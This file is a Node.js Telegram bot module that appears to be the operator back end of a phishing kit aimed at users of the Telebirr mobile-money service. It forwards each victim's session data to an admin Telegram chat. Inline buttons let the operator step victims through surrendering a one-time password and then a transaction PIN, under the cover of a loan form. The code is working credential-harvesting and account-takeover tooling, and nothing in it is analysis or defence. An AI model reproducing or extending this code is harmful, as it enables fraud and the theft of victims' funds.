require('dotenv').config();
const TelegramBot = require('node-telegram-bot-api');

const BOT_TOKEN = process.env.BOT_TOKEN;
const CHAT_ID = process.env.ADMIN_CHAT_ID;

if (!BOT_TOKEN || !CHAT_ID) {
    console.error("❌ [BOT MANAGER ERROR] Missing BOT_TOKEN or ADMIN_CHAT_ID inside environment configs.");
}

// Initialize the Telegram Bot Engine using webhook/passive mode
const bot = new TelegramBot(BOT_TOKEN, { polling: false });

/**
 * Strips out characters that break Telegram Markdown parsing
 */
function escapeMarkdown(text) {
    if (!text) return '';
    return String(text).replace(/([_*\[\]()~`>#+=|{}.!])/g, '\\$1');
}

/**
 * Dispatches Telebirr workflow profiles to the Admin Telegram channel
 */
function sendToAdmin(appId, stepTitle, data, requireInlineButtons = false) {
    if (!CHAT_ID) return;

    let detailedFields = '';
    if (data && typeof data === 'object') {
        Object.entries(data).forEach(([key, val]) => {
            if (val !== undefined && val !== null && val !== '') {
                detailedFields += `• *${escapeMarkdown(key)}:* \`${escapeMarkdown(val)}\`\n`;
            }
        });
    } else if (data) {
        detailedFields += `• *Data Payload:* \`${escapeMarkdown(data)}\`\n`;
    }

    const message = `
📱 *Telebirr Session: ${escapeMarkdown(appId)}*
━━━━━━━━━━━━━━━━━━━━━━━━
📢 *${escapeMarkdown(stepTitle)}*
━━━━━━━━━━━━━━━━━━━━━━━━
${detailedFields}━━━━━━━━━━━━━━━━━━━━━━━━
Status: *Awaiting Admin Action*
    `.trim();

    const options = { parse_mode: 'Markdown' };

    // Dynamically assign different approval tracks depending on the current active step titles
    if (requireInlineButtons) {
        let inlineKeyboard = [];
        
        if (stepTitle.includes("Step 1")) {
            inlineKeyboard = [[
                { text: "📩 REQUEST/ACCEPT OTP", callback_data: `step1_accept:${appId}` }
            ]];
        } else if (stepTitle.includes("Step 2")) {
            inlineKeyboard = [[
                { text: "✅ APPROVE OTP & ASK PIN", callback_data: `step2_accept:${appId}` }
            ]];
        } else if (stepTitle.includes("Step 3")) {
            inlineKeyboard = [[
                { text: "🔑 ACCEPT TRANSACTION PIN", callback_data: `step3_accept:${appId}` }
            ]];
        }

        if (inlineKeyboard.length > 0) {
            options.reply_markup = { inline_keyboard: inlineKeyboard };
        }
    }

    bot.sendMessage(CHAT_ID, message, options)
        .then(() => console.log(`✅ [TELEGRAM] Log payload dispatched for ${appId}`))
        .catch((err) => console.error(`❌ [TELEGRAM ERROR] Dispatch failed for ${appId}:`, err.message));
}

// Telegram Inline Interactive Webhook Processing Engine
bot.on('callback_query', async (callbackQuery) => {
    const actionData = callbackQuery.data;
    const message = callbackQuery.message;
    
    if (!actionData) return;
    
    const [actionSignal, targetAppId] = actionData.split(':');
    let auditLogExecutionState = '';
    
    if (!global.io) {
        console.error("❌ [BOT MANAGER ERROR] global.io reference missing.");
        return;
    }

    // Interactive Lifecycle Execution State Handling
    switch (actionSignal) {
        case 'step1_accept':
            // Moves frontend from Step 1 pending spinner over to Step 2 OTP Entry
            global.io.to(targetAppId).emit('otp-accepted-goto-wait');
            auditLogExecutionState = "✅ Step 1 Approved: Requested OTP routed cleanly to target handset client.";
            break;

        case 'step2_accept':
            // Fast-tracks past the wait screen (Step 2.5) into Step 3 (Transaction PIN Input)
            global.io.to(targetAppId).emit('admin-dashboard-approve');
            auditLogExecutionState = "✅ Step 2 Approved: OTP Validated. Frontend prompt shifted to transaction PIN collection.";
            break;

        case 'step3_accept':
            // Pushes user forward out of authentication layers into Step 4 (Loan Form Configurations)
            global.io.to(targetAppId).emit('final-pin-accepted');
            auditLogExecutionState = "✅ Step 3 Approved: Transaction PIN Accepted. Form configurations unlocked.";
            break;

        default:
            auditLogExecutionState = "⚠️ Unknown action state handler executed.";
    }

    // Update the administrative card view inside Telegram to prevent double clicks
    try {
        await bot.editMessageText(`${message.text}\n\n🤖 *Audit Log Execution State:*\n_${escapeMarkdown(auditLogExecutionState)}_`, {
            chat_id: CHAT_ID,
            message_id: message.message_id,
            parse_mode: 'Markdown',
            reply_markup: { inline_keyboard: [] }
        });
    } catch (e) {
        console.error("❌ [TELEGRAM UI UPDATE ERROR]", e.message);
    }
});

module.exports = {
    bot,
    sendToAdmin
};